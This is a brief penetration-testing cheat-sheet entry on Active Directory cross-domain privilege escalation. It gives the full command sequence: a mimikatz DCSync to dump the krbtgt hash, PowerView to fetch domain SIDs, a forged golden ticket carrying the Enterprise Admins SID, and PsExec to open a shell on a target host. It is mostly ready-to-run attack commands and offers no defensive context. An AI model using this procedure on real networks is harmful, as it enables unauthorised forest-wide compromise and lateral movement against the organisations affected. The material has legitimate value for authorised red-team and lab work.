If we have dcsync we can forge a golden ticket on the DC of the root domain to pivot to another computer or domain controller by obtaining enterprise admin group membership.

In mimikatz we can try to obtain the hash of the krbtgt.

> It's important here that we put the first part of the domain only when supplying the user. For example if our domain is lime.office.com we put lime\krbtgt:

```
lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt
```

> Once we have the hash we need the SID for our current domain and target domain using PowerView:

```
Get-DomainSID -Domain <domain>
```

> Once we have the SIDs we can do the attack:

```
kerberos::golden /user:<anyuser> /domain:<domain> /sid:<current_domain_sid> /krbtgt:<hash> /sids:<target_domain_sid>-519 /ptt
```

> Once the ticket is created and injected we can exit mimikatz and use psexec64.exe to move to the target machine:

```
.\PsExec64.exe \\<target_hostname> cmd
```
